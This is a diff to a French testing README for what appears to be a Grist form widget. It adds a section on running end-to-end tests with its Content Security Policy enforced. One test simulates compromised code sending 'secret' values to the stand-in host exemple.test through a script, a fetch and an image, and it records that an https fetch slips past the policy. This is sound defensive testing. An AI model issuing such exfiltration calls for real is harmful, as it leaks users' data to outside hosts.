@@ -242,6 +242,43 @@ ne convient pas : la page perd son adresse réseau réelle et Chromium refuse al
 (« Permission was denied … `loopback` address space »). La clé de partage est la vraie, lue en lecture seule dans
 `home.sqlite3` (table `shares`, voir « Écart constaté »). Ce test n'écrit que dans `Reponses` (2 lignes de plus).
 
+## Mesurer avec la politique de sécurité appliquée (19 nov 2026, consignes GFS 037 et 038)
+
+Les essais `e2e-build-first/guided-visitor/same-link/late-connection/model` ouvraient leur navigateur avec
+`bypassCSP: true` (point 5 plus bas : Grist de test en HTTP nu, que `connect-src https:` ne laisse pas passer) : la
+politique des pages n'était mesurée nulle part en conditions réelles, hors `e2e-send-another.js`. Depuis la consigne 037
+(`widget.html` part de `default-src 'none'`), il faut pouvoir la garder :
+
+```bash
+pkill -f "http.server 8010"                       # le serveur de start-grist-test.sh, même port : le document y pointe
+node tests/grist-env/serveur-csp.js 8010 8484 &   # sert le dépôt tel quel, + http://localhost:8484 dans connect-src / img-src
+FORMPLUS_CSP=1 NODE_PATH=$(npm root -g) node tests/grist-env/e2e-build-first.js   # etc. : bypassCSP est alors faux
+```
+
+`serveur-csp.js` ne change que ça (l'origine HTTP de CE Grist, équivalent pour le banc du `https:` d'un vrai Grist) ;
+`default-src`, `script-src`, `style-src`, `form-action`… sont ceux du dépôt, donc appliqués pour de bon. Sans
+`FORMPLUS_CSP`, les essais gardent leur comportement d'avant (contournement). Mesuré le 19 nov sur Grist 1.7.22 avec la
+politique de la 037 : `onboarding`, `build-first`, `guided-visitor`, `same-link`, `model`, `send-another` verts (sur un
+document déjà passé par `FormPlus_Formulaires`, voir plus bas) ; `late-connection` rouge sur un seul contrôle (« le
+diagnostic passe à `onOptions` ») **quand il suit les autres** dans le même document, identique avec ou sans la politique
+et avec l'ancien code (`c244d49`) ; seul, il est vert avec et sans.
+
+`e2e-public-form.js` (sans `FORMPLUS_CSP`, mais avec `serveur-csp.js`) joue les deux pages statiques, `index.html` et
+`poc/public-form.html`, qui partent aussi de `default-src 'none'` et `form-action 'none'` depuis la 037 : un visiteur
+anonyme remplit un vrai formulaire publié, la réponse arrive dans `Reponses`, « Envoyer une autre réponse » recharge un
+formulaire vierge, zéro violation de la politique.
+
+`e2e-relais-violations.js` (**exige** `FORMPLUS_CSP=1`) mesure le relais S8 du kit (`kit/js/violations-start.js`, importé en
+tête de `poc/js/main.js`) : le widget est ouvert dans la page du document avec `gfs=1` (comme sous GFS), la page de Grist
+joue GFS (note les messages du cadre, répond à `contexte`), puis le test fait DANS le cadre ce qu'un code piraté
+tenterait. Mesuré : au démarrage `securite` / `relais` avec la version du kit ; un script de `https://exemple.test/x.js?secret=1`,
+un `fetch('http://exemple.test/y?secret=2')` et une image `http://exemple.test/z.png?secret=3` sont bloqués et relayés
+avec `exemple.test` seul (`script-src-elem`, `connect-src`, `img-src`), aucun message ne contient `secret` ni un chemin.
+**La limite, mesurée aussi** : `fetch('https://exemple.test/ok?secret=4')` n'est ni bloqué ni relayé, puisque
+`connect-src https:` le permet (l'exception de la règle S3 : l'app appelle le serveur Grist de la personne, hôte inconnu
+d'avance). Le « fetch https vers `exemple.test` » que propose le point 5 de la consigne 038 ne lève donc rien pour Form+ ;
+un script tiers, un appel ou une image en `http:` en lèvent.
+
 ## Connexion à Grist qui arrive après les 4 s de `main.js` (18 nov 2026, consigne GFS 032)
 
 `e2e-late-connection.js` répond à la question de la consigne 032 : quand `grist.onOptions` arrive après le minuteur de
@@ -420,6 +457,7 @@ tester la suite du transport 1 en anonyme.
 
 - `vitrine-captures.js` — les trois captures de la vitrine de GFS (voir plus haut).
 - `e2e-late-connection.js` — connexion à Grist tardive, avec ou sans GFS (voir plus haut).
+- `serveur-csp.js`, `e2e-public-form.js` et `e2e-relais-violations.js` — la politique de sécurité appliquée pour de bon, les deux pages statiques sous cette politique, et le relais S8 vers GFS (voir plus haut).
 - `e2e-model.js` — « Nouveau > Depuis un modèle » de GFS, de l'ouverture au visiteur anonyme (voir plus haut).
 - `modeles-captures.js` — les vignettes des modèles (voir plus haut).
 - `start-grist-test.sh` — le script de démarrage.
